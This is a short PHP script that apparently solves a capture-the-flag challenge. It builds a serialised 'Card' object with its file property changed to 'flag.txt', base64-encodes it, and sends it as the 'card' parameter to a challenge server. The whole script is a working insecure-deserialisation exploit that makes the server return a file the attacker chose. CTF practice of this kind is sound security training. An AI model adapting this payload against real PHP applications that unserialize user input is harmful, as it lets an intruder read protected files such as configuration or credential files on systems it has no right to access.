<?php

class Card{
    public $file = "card.txt";    
    function __construct() {
    }
}

$card = new Card;
$card->file = 'flag.txt';
$sd = serialize($card);
$sd64 = base64_encode($sd);

echo "Serialized Card data: " . $sd . "\n";
echo "Base64 encoded Card data: " . $sd64 . "\n";
echo "\nGetting flag.txt...\n\n";
echo file_get_contents("http://rsxc.no:20017/?card=" . $sd64);